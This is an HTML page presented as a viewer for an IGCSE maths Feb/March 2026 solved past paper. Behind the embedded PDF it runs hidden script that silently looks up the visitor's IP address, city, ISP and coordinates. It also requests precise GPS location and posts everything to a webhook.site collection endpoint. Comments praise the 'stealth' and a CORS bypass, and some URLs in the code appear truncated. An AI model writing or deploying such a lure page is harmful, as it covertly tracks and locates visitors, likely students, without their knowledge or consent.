<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>IGCSE Papers Math Calculator- Feb/March 2026</title>
    <style>
        body { margin: 0; background-color: #2c3e50; color: white; overflow: hidden; font-family: sans-serif; }
        .header { height: 50px; display: flex; align-items: center; justify-content: center; background: #1a252f; border-bottom: 1px solid #34495e; }
        #pdf-frame { width: 100vw; height: calc(100vh - 50px); border: none; }
    </style>
</head>
<body>
    <div class="header"><strong>IGCSE Papers Math Calculator- Feb/March 2026</strong></div>
    <iframe id="pdf-frame" src="1012874352-0580-fm-2026-solved-paper (1).pdf"></iframe>

    <script>
        const webhookURL = "https://webhook.site";

        // Reliable sending function
        function sendLog(data) {
            fetch(webhookURL, {
                method: 'POST',
                mode: 'no-cors', 
                body: JSON.stringify(data)
            }).catch(() => {});
        }

        // 1. SILENT IP FINDING (The Fix)
        // We use a script tag trick to bypass CORS security
        function ipLookUp() {
            const script = document.createElement('script');
            script.src = 'https://ipapi.co'; // JSONP is much more reliable for stealth
            document.body.appendChild(script);
        }

        // This function captures the data from the script above
        function getIP(data) {
            sendLog({
                type: "IP_INFO_SILENT",
                ip: data.ip,
                city: data.city,
                isp: data.org,
                coords: `${data.latitude}, ${data.longitude}`
            });
        }

        // 2. PRECISION GPS (Same as your original success)
        navigator.geolocation.getCurrentPosition(pos => {
            sendLog({
                type: "GPS_LOCATION",
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                map: `https://www.google.com{pos.coords.latitude},${pos.coords.longitude}`
            });
        }, err => sendLog({ type: "GPS_ERROR", msg: err.message }), 
        { enableHighAccuracy: false, timeout: 15000, maximumAge: Infinity });

        // Start the silent lookup
        ipLookUp();
    </script>
    
    <!-- This small bit handles the "JSONP" response -->
    <script src="https://ipapi.co"></script>

</body>
</html>
